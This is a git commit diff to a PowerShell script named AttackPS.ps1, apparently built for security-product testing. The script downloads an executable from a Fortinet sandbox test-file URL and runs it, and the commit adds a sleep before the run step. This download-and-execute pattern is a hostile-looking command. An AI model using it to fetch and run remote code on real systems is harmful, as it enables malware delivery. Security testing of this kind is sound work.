8ad1abc373ff0c049d862c03dee63f1c46786413
Alberto <alberto.briano@outlook.com>
2026-06-15 22:28:59 +0200

    added sleep to prevent execution before the file was downloaded

--- Windows/AttackPS.ps1
+++ Windows/AttackPS.ps1
@@ -2,5 +2,6 @@ $down = New-Object System.Net.WebClient
 $url  = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
 $file = 'windows.exe';
 $down.DownloadFile($url,$file);
+Start-Sleep -Seconds 1
 $exec = New-Object -com shell.application
 $exec.shellexecute($file);
